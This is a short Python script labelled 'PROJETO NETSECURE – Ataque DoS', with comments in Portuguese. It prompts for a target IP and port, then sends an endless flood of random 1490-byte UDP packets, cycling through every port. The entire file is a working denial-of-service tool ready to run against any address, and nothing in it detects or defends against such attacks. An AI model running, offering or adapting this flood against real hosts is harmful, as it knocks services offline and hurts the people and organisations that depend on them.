# Bibliotecas

import socket
import random
import sys
import os
import time

# Configurando o tempo

from datetime import datetime
agora = datetime.now()
hora = agora.hour
minuto = agora.minute
dia  = agora.day
mes = agora.month
ano = agora.year

#parametros do socket e tamanho dos pacotes

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
############################

os.system("cls")
print("PROJETO NETSECURE")
print("Ataque DoS")

#input de dados

ip = input("IP : ")
porta = int(input("Porta : "))

os.system("cls")

print("Iniciando")
time.sleep(3)

#envio infinito

num = 0
while True:
     #envia os pacotes

     sock.sendto(bytes, (ip, porta))

     num = num + 1
     porta = porta + 1

     print ("%s pacotes enviados para %s pela porta: %s"%(num, ip, porta))

     #certifica que os pacotes sejam enviados para portas existentes

     if porta == 65534:
       porta = 1